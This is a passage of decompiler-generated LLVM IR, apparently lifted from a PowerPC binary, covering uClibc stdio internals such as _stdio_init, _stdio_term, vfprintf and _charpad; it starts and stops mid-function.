  uselistorder i32 %v0_1000dfc4, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_1000e054, { 1, 0 }
  uselistorder label %dec_label_pc_1000e00c, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* @r28, align 4
  %v0_1000e07c = call i32 @__errno_location()
  store i32 %v0_1000e07c, i32* @r26, align 4
  %v1_1000e088 = inttoptr i32 %v0_1000e07c to i32*
  %v2_1000e088 = load i32, i32* %v1_1000e088, align 4
  store i32 %v2_1000e088, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_1002a860.581 to i32), i32* @r27, align 4
  %v3_1000e090 = load i16, i16* @global_var_1002a860.581, align 2
  %v4_1000e090 = zext i16 %v3_1000e090 to i32
  store i32 %v4_1000e090, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000e098.585 to i32), i32* @lr, align 4
  %v1_1000e094 = call i32 @isatty(i32 0)
  %v1_1000e098 = sub i32 1, %v1_1000e094
  %v1_1000e09c = mul i32 %v1_1000e098, 256
  %v0_1000e0a0 = load i32, i32* @r29, align 4
  %v2_1000e0a0 = xor i32 %v1_1000e09c, %v0_1000e0a0
  %v1_1000e0a8 = trunc i32 %v2_1000e0a0 to i16
  store i16 %v1_1000e0a8, i16* @global_var_1002a860.581, align 2
  %v3_1000e0ac = load i16, i16* @global_var_1002a8b0.582, align 2
  %v4_1000e0ac = zext i16 %v3_1000e0ac to i32
  store i32 %v4_1000e0ac, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000e0b4.586 to i32), i32* @lr, align 4
  %v1_1000e0b0 = call i32 @isatty(i32 1)
  %v1_1000e0b4 = sub i32 1, %v1_1000e0b0
  %v1_1000e0b8 = mul i32 %v1_1000e0b4, 256
  %v0_1000e0bc = load i32, i32* @r29, align 4
  %v2_1000e0bc = xor i32 %v1_1000e0b8, %v0_1000e0bc
  %v1_1000e0c0 = trunc i32 %v2_1000e0bc to i16
  store i16 %v1_1000e0c0, i16* @global_var_1002a8b0.582, align 2
  %v0_1000e0c4 = load i32, i32* @r25, align 4
  %v1_1000e0c4 = load i32, i32* @r26, align 4
  %v2_1000e0c4 = inttoptr i32 %v1_1000e0c4 to i32*
  store i32 %v0_1000e0c4, i32* %v2_1000e0c4, align 4
  ret i32 %v1_1000e0b8

; uselistorder directives
  uselistorder i32 %v1_1000e0b8, { 1, 0 }
  uselistorder i16* @global_var_1002a8b0.582, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10019560.587 to i32), i32* @r4, align 4
  %v0_1000e0e8 = call i32 @memcpy()
  ret i32 %v0_1000e0e8
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002a830.588 to i32), i32* @r3, align 4
  store i32 268493064, i32* @lr, align 4
  %v0_1000e104 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_1002a848.589 to i32), i32* @r3, align 4
  store i32 268493076, i32* @lr, align 4
  %v0_1000e110 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_1002ab90.590 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_1000e15c9 = icmp eq i32 %storemerge6, 0
  %v1_1000e16011 = add i32 %storemerge6, 56
  store i32 %v1_1000e16011, i32* %r30.global-to-local, align 4
  br i1 %v3_1000e15c9, label %dec_label_pc_1000e16c, label %dec_label_pc_1000e120

dec_label_pc_1000e120:                            ; preds = %entry, %dec_label_pc_1000e14c
  %v0_1000e120 = call i32 @__pthread_return_0()
  %v3_1000e124 = icmp eq i32 %v0_1000e120, 0
  %v0_1000e128 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000e128, i32* @r3, align 4
  br i1 %v3_1000e124, label %dec_label_pc_1000e14c, label %dec_label_pc_1000e130

dec_label_pc_1000e130:                            ; preds = %dec_label_pc_1000e120
  %v0_1000e130 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000e130 = add i32 %v0_1000e130, 8
  %v2_1000e130 = inttoptr i32 %v1_1000e130 to i32*
  %v3_1000e130 = load i32, i32* %v2_1000e130, align 4
  store i32 %v3_1000e130, i32* %r9.global-to-local, align 4
  %v3_1000e138 = inttoptr i32 %v0_1000e130 to i16*
  store i16 48, i16* %v3_1000e138, align 2
  %v0_1000e13c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e13c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e13c = add i32 %v1_1000e13c, 20
  %v3_1000e13c = inttoptr i32 %v2_1000e13c to i32*
  store i32 %v0_1000e13c, i32* %v3_1000e13c, align 4
  %v0_1000e140 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e140 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e140 = add i32 %v1_1000e140, 24
  %v3_1000e140 = inttoptr i32 %v2_1000e140 to i32*
  store i32 %v0_1000e140, i32* %v3_1000e140, align 4
  %v0_1000e144 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e144 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e144 = add i32 %v1_1000e144, 28
  %v3_1000e144 = inttoptr i32 %v2_1000e144 to i32*
  store i32 %v0_1000e144, i32* %v3_1000e144, align 4
  %v0_1000e148 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e148 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e148 = add i32 %v1_1000e148, 16
  %v3_1000e148 = inttoptr i32 %v2_1000e148 to i32*
  store i32 %v0_1000e148, i32* %v3_1000e148, align 4
  br label %dec_label_pc_1000e14c

dec_label_pc_1000e14c:                            ; preds = %dec_label_pc_1000e120, %dec_label_pc_1000e130
  %v1_1000e150 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e150 = add i32 %v1_1000e150, 52
  %v3_1000e150 = inttoptr i32 %v2_1000e150 to i32*
  store i32 1, i32* %v3_1000e150, align 4
  store i32 268493144, i32* @lr, align 4
  %v0_1000e154 = call i32 @__stdio_init_mutex()
  %v0_1000e158 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000e158 = add i32 %v0_1000e158, 32
  %v2_1000e158 = inttoptr i32 %v1_1000e158 to i32*
  %storemerge = load i32, i32* %v2_1000e158, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_1000e15c = icmp eq i32 %storemerge, 0
  %v1_1000e160 = add i32 %storemerge, 56
  store i32 %v1_1000e160, i32* %r30.global-to-local, align 4
  br i1 %v3_1000e15c, label %dec_label_pc_1000e15c.dec_label_pc_1000e16c_crit_edge, label %dec_label_pc_1000e120

dec_label_pc_1000e15c.dec_label_pc_1000e16c_crit_edge: ; preds = %dec_label_pc_1000e14c
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1002ab90.590 to i32*), align 4
  br label %dec_label_pc_1000e16c

dec_label_pc_1000e16c:                            ; preds = %dec_label_pc_1000e15c.dec_label_pc_1000e16c_crit_edge, %entry
  %v0_1000e1a816 = phi i32 [ %v1_1000e160, %dec_label_pc_1000e15c.dec_label_pc_1000e16c_crit_edge ], [ %v1_1000e16011, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_1000e15c.dec_label_pc_1000e16c_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_1000e1905 = icmp eq i32 %storemerge12, 0
  br i1 %v3_1000e1905, label %dec_label_pc_1000e198, label %dec_label_pc_1000e178

dec_label_pc_1000e178:                            ; preds = %dec_label_pc_1000e16c, %dec_label_pc_1000e18c
  %v0_1000e178 = phi i32 [ %storemerge1, %dec_label_pc_1000e18c ], [ %storemerge12, %dec_label_pc_1000e16c ]
  %v1_1000e178 = inttoptr i32 %v0_1000e178 to i16*
  %v2_1000e178 = load i16, i16* %v1_1000e178, align 2
  %v3_1000e178 = zext i16 %v2_1000e178 to i32
  store i32 %v0_1000e178, i32* @r3, align 4
  %v1_1000e180 = and i32 %v3_1000e178, 64
  store i32 %v1_1000e180, i32* %r9.global-to-local, align 4
  %v3_1000e180 = icmp eq i32 %v1_1000e180, 0
  br i1 %v3_1000e180, label %dec_label_pc_1000e18c, label %dec_label_pc_1000e188

dec_label_pc_1000e188:                            ; preds = %dec_label_pc_1000e178
  store i32 268493196, i32* @lr, align 4
  %v0_1000e188 = call i32 @__stdio_wcommit()
  %v0_1000e18c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e18c

dec_label_pc_1000e18c:                            ; preds = %dec_label_pc_1000e178, %dec_label_pc_1000e188
  %v0_1000e18c = phi i32 [ %v0_1000e178, %dec_label_pc_1000e178 ], [ %v0_1000e18c.pre, %dec_label_pc_1000e188 ]
  %v0_1000e1a817 = phi i32 [ %v0_1000e178, %dec_label_pc_1000e178 ], [ %v0_1000e188, %dec_label_pc_1000e188 ]
  %v1_1000e18c = add i32 %v0_1000e18c, 32
  %v2_1000e18c = inttoptr i32 %v1_1000e18c to i32*
  %storemerge1 = load i32, i32* %v2_1000e18c, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_1000e190 = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000e190, label %dec_label_pc_1000e198, label %dec_label_pc_1000e178

dec_label_pc_1000e198:                            ; preds = %dec_label_pc_1000e18c, %dec_label_pc_1000e16c
  %v0_1000e1a8 = phi i32 [ %v0_1000e1a816, %dec_label_pc_1000e16c ], [ %v0_1000e1a817, %dec_label_pc_1000e18c ]
  ret i32 %v0_1000e1a8

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_1000e178, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e18c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e178, { 1, 0 }
  uselistorder label %dec_label_pc_1000e14c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e120, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_1000e1b4 = load i32, i32* @r31, align 4
  %v0_1000e1b8 = load i32, i32* @r3, align 4
  %v1_1000e1c0 = add i32 %v0_1000e1b8, 8
  %v2_1000e1c0 = inttoptr i32 %v1_1000e1c0 to i32*
  %v3_1000e1c0 = load i32, i32* %v2_1000e1c0, align 4
  %v1_1000e1c4 = add i32 %v0_1000e1b8, 16
  %v2_1000e1c4 = inttoptr i32 %v1_1000e1c4 to i32*
  %v3_1000e1c4 = load i32, i32* %v2_1000e1c4, align 4
  %v2_1000e1cc = sub i32 %v3_1000e1c4, %v3_1000e1c0
  store i32 %v2_1000e1cc, i32* @r5, align 4
  %v5_1000e1cc = icmp eq i32 %v2_1000e1cc, 0
  br i1 %v5_1000e1cc, label %dec_label_pc_1000e1dc, label %dec_label_pc_1000e1d4

dec_label_pc_1000e1d4:                            ; preds = %entry
  store i32 %v3_1000e1c0, i32* %v2_1000e1c4, align 4
  store i32 268493276, i32* @lr, align 4
  %v2_1000e1d8 = inttoptr i32 %v3_1000e1c0 to i16*
  %v3_1000e1d8 = call i32 @__stdio_WRITE(i16* %v2_1000e1d8, i32 %v2_1000e1cc)
  %v0_1000e1dc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e1dc

dec_label_pc_1000e1dc:                            ; preds = %entry, %dec_label_pc_1000e1d4
  %v0_1000e1dc = phi i32 [ %v0_1000e1b8, %entry ], [ %v0_1000e1dc.pre, %dec_label_pc_1000e1d4 ]
  %v1_1000e1dc = add i32 %v0_1000e1dc, 8
  %v2_1000e1dc = inttoptr i32 %v1_1000e1dc to i32*
  %v3_1000e1dc = load i32, i32* %v2_1000e1dc, align 4
  %v1_1000e1e0 = add i32 %v0_1000e1dc, 16
  %v2_1000e1e0 = inttoptr i32 %v1_1000e1e0 to i32*
  %v3_1000e1e0 = load i32, i32* %v2_1000e1e0, align 4
  store i32 %v0_1000e1b4, i32* @r31, align 4
  %v2_1000e1e8 = sub i32 %v3_1000e1e0, %v3_1000e1dc
  ret i32 %v2_1000e1e8

; uselistorder directives
  uselistorder i32 %v0_1000e1dc, { 1, 0 }
  uselistorder i32 %v3_1000e1c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e1dc, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000e208 = load i32, i32* @r3, align 4
  %v0_1000e210 = load i32, i32* @r4, align 4
  store i32 %v0_1000e210, i32* @r29, align 4
  store i32 %v0_1000e208, i32* @r31, align 4
  %v1_1000e21c = add i32 %v0_1000e208, 52
  %v2_1000e21c = inttoptr i32 %v1_1000e21c to i32*
  %v3_1000e21c = load i32, i32* %v2_1000e21c, align 4
  store i32 %v3_1000e21c, i32* @r28, align 4
  %v0_1000e220 = load i32, i32* @r5, align 4
  store i32 %v0_1000e220, i32* @r27, align 4
  %v2_1000e224 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e224, i32* @r3, align 4
  %v3_1000e22c = icmp eq i32 %v3_1000e21c, 0
  br i1 %v3_1000e22c, label %dec_label_pc_1000e238, label %dec_label_pc_1000e244

dec_label_pc_1000e238:                            ; preds = %entry
  %v0_1000e238 = call i32 @__pthread_return_void()
  %v0_1000e240 = call i32 @__pthread_return_0()
  %v0_1000e244.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e244

dec_label_pc_1000e244:                            ; preds = %entry, %dec_label_pc_1000e238
  %v0_1000e244 = phi i32 [ %v0_1000e208, %entry ], [ %v0_1000e244.pre, %dec_label_pc_1000e238 ]
  %v1_1000e244 = inttoptr i32 %v0_1000e244 to i16*
  %v2_1000e244 = load i16, i16* %v1_1000e244, align 2
  %v3_1000e244 = zext i16 %v2_1000e244 to i32
  store i32 128, i32* @r4, align 4
  store i32 %v0_1000e244, i32* @r3, align 4
  store i32 -1, i32* @r30, align 4
  %v1_1000e254 = call i32 @__asm_rlwinm(i32 %v3_1000e244, i32 0, i32 24, i32 25)
  %v3_1000e258 = icmp eq i32 %v1_1000e254, 192
  br i1 %v3_1000e258, label %dec_label_pc_1000e26c, label %dec_label_pc_1000e260

dec_label_pc_1000e260:                            ; preds = %dec_label_pc_1000e244
  store i32 268493412, i32* @lr, align 4
  %v0_1000e260 = call i32 @__stdio_trans2w_o()
  %v3_1000e264 = icmp eq i32 %v0_1000e260, 0
  br i1 %v3_1000e264, label %dec_label_pc_1000e26c, label %dec_label_pc_1000e280

dec_label_pc_1000e26c:                            ; preds = %dec_label_pc_1000e260, %dec_label_pc_1000e244
  %v0_1000e26c = load i32, i32* @r29, align 4
  store i32 %v0_1000e26c, i32* @r4, align 4
  %v0_1000e270 = load i32, i32* @r27, align 4
  store i32 %v0_1000e270, i32* @r5, align 4
  %v0_1000e274 = load i32, i32* @r31, align 4
  store i32 %v0_1000e274, i32* @r3, align 4
  store i32 268493436, i32* @lr, align 4
  %v0_1000e278 = call i32 @_vfprintf_internal()
  store i32 %v0_1000e278, i32* @r30, align 4
  br label %dec_label_pc_1000e280

dec_label_pc_1000e280:                            ; preds = %dec_label_pc_1000e260, %dec_label_pc_1000e26c
  %v0_1000e280 = load i32, i32* @r28, align 4
  %v3_1000e280 = icmp eq i32 %v0_1000e280, 0
  store i32 %v2_1000e224, i32* @r3, align 4
  br i1 %v3_1000e280, label %dec_label_pc_1000e290, label %dec_label_pc_1000e294

dec_label_pc_1000e290:                            ; preds = %dec_label_pc_1000e280
  %v0_1000e290 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000e294

dec_label_pc_1000e294:                            ; preds = %dec_label_pc_1000e280, %dec_label_pc_1000e290
  %v0_1000e298 = load i32, i32* @r30, align 4
  ret i32 %v0_1000e298

; uselistorder directives
  uselistorder i32 %v0_1000e244, { 1, 0 }
  uselistorder i32 %v0_1000e208, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e294, { 1, 0 }
  uselistorder label %dec_label_pc_1000e280, { 1, 0 }
  uselistorder label %dec_label_pc_1000e244, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_1000e2d44 = icmp eq i32 %arg3, 0
  %v2_1000e2d8 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_1000e2d44, label %dec_label_pc_1000e2f4, label %dec_label_pc_1000e2e8

dec_label_pc_1000e2d0:                            ; preds = %dec_label_pc_1000e2e8
  %v1_1000e2d0 = add i32 %v0_1000e2d0, -1
  store i32 %v1_1000e2d0, i32* @r31, align 4
  %v3_1000e2d4 = icmp eq i32 %v1_1000e2d0, 0
  %v0_1000e2e0 = load i32, i32* @r29, align 4
  br i1 %v3_1000e2d4, label %dec_label_pc_1000e2f4.loopexit, label %dec_label_pc_1000e2e8

dec_label_pc_1000e2e8:                            ; preds = %entry, %dec_label_pc_1000e2d0
  %v0_1000e2e06 = phi i32 [ %v0_1000e2e0, %dec_label_pc_1000e2d0 ], [ %arg1, %entry ]
  store i32 268493548, i32* @lr, align 4
  %v3_1000e2e8 = inttoptr i32 %v0_1000e2e06 to i16*
  %v4_1000e2e8 = call i32 @__stdio_fwrite(i32 %v2_1000e2d8, i32 1, i16* %v3_1000e2e8)
  %v3_1000e2ec = icmp eq i32 %v4_1000e2e8, 1
  %v0_1000e2d0 = load i32, i32* @r31, align 4
  br i1 %v3_1000e2ec, label %dec_label_pc_1000e2d0, label %dec_label_pc_1000e2f4.loopexit

dec_label_pc_1000e2f4.loopexit:                   ; preds = %dec_label_pc_1000e2d0, %dec_label_pc_1000e2e8
  %v0_1000e2f8.ph = phi i32 [ %v0_1000e2d0, %dec_label_pc_1000e2e8 ], [ 0, %dec_label_pc_1000e2d0 ]
  %v1_1000e2f8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e2f4

dec_label_pc_1000e2f4:                            ; preds = %dec_label_pc_1000e2f4.loopexit, %entry
  %v1_1000e2f8 = phi i32 [ 0, %entry ], [ %v1_1000e2f8.pre, %dec_label_pc_1000e2f4.loopexit ]
  %v0_1000e2f8 = phi i32 [ 0, %entry ], [ %v0_1000e2f8.ph, %dec_label_pc_1000e2f4.loopexit ]
  %v2_1000e2f8 = sub i32 %v1_1000e2f8, %v0_1000e2f8
  ret i32 %v2_1000e2f8

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e2f4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000e2e8, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_1000e320 = and i32 %arg2, 128
  %v3_1000e320 = icmp eq i32 %v1_1000e320, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000e320, label %dec_label_pc_1000e370, label %dec_label_pc_1000e33c

dec_label_pc_1000e33c:                            ; preds = %entry
  %v0_1000e33c = call i32 @__GI_strlen()
  %v0_1000e340 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000e33c, i32* @r31, align 4
  %v0_1000e348 = load i32, i32* %r26.global-to-local, align 4
  %v1_1000e34c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000e34c = sub i32 %v1_1000e34c, %v0_1000e33c
  store i32 %v2_1000e34c, i32* %r29.global-to-local, align 4
  store i32 %v0_1000e33c, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_1000e34c, 1
  br i1 %tmp7, label %dec_label_pc_1000e370, label %dec_label_pc_1000e35c

dec_label_pc_1000e35c:                            ; preds = %dec_label_pc_1000e33c
  %v1_1000e340 = urem i32 %v0_1000e340, 128
  store i32 268493664, i32* @lr, align 4
  %v3_1000e35c = trunc i32 %v1_1000e340 to i8
  %v4_1000e35c = call i32 @_charpad(i32 %v0_1000e348, i8 %v3_1000e35c, i32 %v2_1000e34c)
  %v0_1000e360 = load i32, i32* @r31, align 4
  store i32 %v0_1000e360, i32* %r30.global-to-local, align 4
  %v1_1000e364 = load i32, i32* @r29, align 4
  %v4_1000e364 = icmp eq i32 %v4_1000e35c, %v1_1000e364
  store i32 %v4_1000e35c, i32* @r28, align 4
  br i1 %v4_1000e364, label %dec_label_pc_1000e35c.dec_label_pc_1000e370_crit_edge, label %dec_label_pc_1000e394

dec_label_pc_1000e35c.dec_label_pc_1000e370_crit_edge: ; preds = %dec_label_pc_1000e35c
  %v0_1000e37c.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000e370

dec_label_pc_1000e370:                            ; preds = %dec_label_pc_1000e35c.dec_label_pc_1000e370_crit_edge, %dec_label_pc_1000e33c, %entry
  %v0_1000e37c = phi i32 [ %v0_1000e37c.pre, %dec_label_pc_1000e35c.dec_label_pc_1000e370_crit_edge ], [ %v0_1000e348, %dec_label_pc_1000e33c ], [ %arg1, %entry ]
  %v0_1000e378 = phi i32 [ %v0_1000e360, %dec_label_pc_1000e35c.dec_label_pc_1000e370_crit_edge ], [ %v0_1000e33c, %dec_label_pc_1000e33c ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_1000e378, 1
  br i1 %tmp8, label %dec_label_pc_1000e390, label %dec_label_pc_1000e388

dec_label_pc_1000e388:                            ; preds = %dec_label_pc_1000e370
  %v0_1000e374 = load i32, i32* @r27, align 4
  store i32 268493708, i32* @lr, align 4
  %v3_1000e388 = inttoptr i32 %v0_1000e37c to i16*
  %v4_1000e388 = call i32 @__stdio_fwrite(i32 %v0_1000e374, i32 %v0_1000e378, i16* %v3_1000e388)
  br label %dec_label_pc_1000e390

dec_label_pc_1000e390:                            ; preds = %dec_label_pc_1000e370, %dec_label_pc_1000e388
  %v1_1000e390 = phi i32 [ 0, %dec_label_pc_1000e370 ], [ %v4_1000e388, %dec_label_pc_1000e388 ]
  %v0_1000e390 = load i32, i32* @r28, align 4
  %v2_1000e390 = add i32 %v0_1000e390, %v1_1000e390
  br label %dec_label_pc_1000e394

dec_label_pc_1000e394:                            ; preds = %dec_label_pc_1000e35c, %dec_label_pc_1000e390
  %v0_1000e398 = phi i32 [ %v4_1000e35c, %dec_label_pc_1000e35c ], [ %v2_1000e390, %dec_label_pc_1000e390 ]
  ret i32 %v0_1000e398

; uselistorder directives
  uselistorder i32 %v0_1000e378, { 1, 0 }
  uselistorder i32 %v2_1000e34c, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e394, { 1, 0 }
  uselistorder label %dec_label_pc_1000e390, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_3()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_3()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1000e3b0 = load i32, i32* @lr, align 4
  store i32 %v0_1000e3b0, i32* %r0.global-to-local, align 4
  %v2_1000e3b8 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_1000e3b8, i32* %r30.global-to-local, align 4
  %v0_1000e3bc = load i32, i32* @r3, align 4
  store i32 %v0_1000e3bc, i32* %r24.global-to-local, align 4
  %v0_1000e3c8 = load i32, i32* @r5, align 4
  store i32 %v0_1000e3c8, i32* %r31.global-to-local, align 4
  %v0_1000e3cc = load i32, i32* @r4, align 4
  store i32 %v0_1000e3cc, i32* @r29, align 4
  store i32 268493780, i32* @lr, align 4
  %v1_1000e3d0 = bitcast i8** %stack_var_-200 to i32*
  %v2_1000e3d0 = call i32 @_ppfs_init(i32* %v1_1000e3d0)
  %tmp72 = icmp sgt i32 %v2_1000e3d0, -1
  br i1 %tmp72, label %dec_label_pc_1000e404, label %dec_label_pc_1000e3dc

dec_label_pc_1000e3dc:                            ; preds = %entry
  %v3_1000e3dc = load i8*, i8** %stack_var_-200, align 4
  %v4_1000e3dc = ptrtoint i8* %v3_1000e3dc to i32
  store i32 %v4_1000e3dc, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_1000e3dc, i32* @r3, align 4
  %v0_1000e3e8 = call i32 @__GI_strlen()
  %v3_1000e3ec = icmp eq i32 %v0_1000e3e8, 0
  br i1 %v3_1000e3ec, label %dec_label_pc_1000ea04, label %dec_label_pc_1000e3f4

dec_label_pc_1000e3f4:                            ; preds = %dec_label_pc_1000e3dc
  %v0_1000e3f4 = load i32, i32* @r31, align 4
  %v0_1000e3f8 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e400.592 to i32), i32* @lr, align 4
  %v3_1000e3fc = inttoptr i32 %v0_1000e3f8 to i16*
  %v4_1000e3fc = call i32 @__stdio_fwrite(i32 %v0_1000e3f4, i32 %v0_1000e3e8, i16* %v3_1000e3fc)
  br label %dec_label_pc_1000ea04

dec_label_pc_1000e404:                            ; preds = %entry
  %v0_1000e408 = load i32, i32* @r31, align 4
  store i32 268493840, i32* @lr, align 4
  %v2_1000e40c = call i32 @_ppfs_prepargs(i32 %v2_1000e3b8, i32 %v0_1000e408)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_1000e4a4 = zext i8 %tmp59 to i32
  %v2_1000e4a8 = icmp sgt i32 %tmp60, 0
  %v2_1000e4ac = ptrtoint i32* %stack_var_-112 to i32
  %v2_1000e4d0 = ptrtoint i32* %stack_var_-344 to i32
  %v3_1000e4d4 = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_1000e508 = icmp eq i32 %tmp57, 0
  %v2_1000e864 = ptrtoint i32* %stack_var_-328 to i32
  %v2_1000e784 = ptrtoint i32* %stack_var_-340 to i32
  %v2_1000e788 = ptrtoint i32* %stack_var_-336 to i32
  %v5_1000e5fc = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_1000e6d8 = icmp eq i32 %tmp57, 1
  %v2_1000e67c = icmp ugt i32 %tmp57, 2
  %v4_1000e5bc = zext i8 %tmp55 to i32
  %v0_1000e9f0.pre = load i32, i32* @r29, align 4
  %v1_1000e4bc = mul nuw nsw i32 %v4_1000e4a4, 8
  %v2_1000e4c0 = add i32 %v2_1000e4ac, %v1_1000e4bc
  %v1_1000e4c4 = add i32 %v2_1000e4c0, -8
  %v1_1000e4d8 = add i32 %tmp58, 1
  %v2_1000e530 = icmp ugt i32 %tmp57, 7
  %v2_1000e710 = icmp ugt i32 %tmp57, 15
  %v2_1000e744 = icmp ugt i32 %tmp57, 17
  %v3_1000e744 = icmp eq i32 %tmp57, 17
  %v2_1000e7ec = icmp ugt i32 %tmp57, 19
  %v3_1000e7ec = icmp eq i32 %tmp57, 19
  %v3_1000e858 = icmp eq i32 %tmp57, 20
  %v1_1000e548 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_10019594.594 to i32), i32 -1)
  %v2_1000e548 = inttoptr i32 %v1_1000e548 to i8*
  %v3_1000e688 = icmp eq i32 %tmp57, 3
  %v3_1000e698 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_1000e9f0

dec_label_pc_1000e41c.backedge:                   ; preds = %dec_label_pc_1000e470, %dec_label_pc_1000e428
  %storemerge13.in = phi i32 [ %v1_1000e438, %dec_label_pc_1000e428 ], [ %v1_1000e470, %dec_label_pc_1000e470 ]
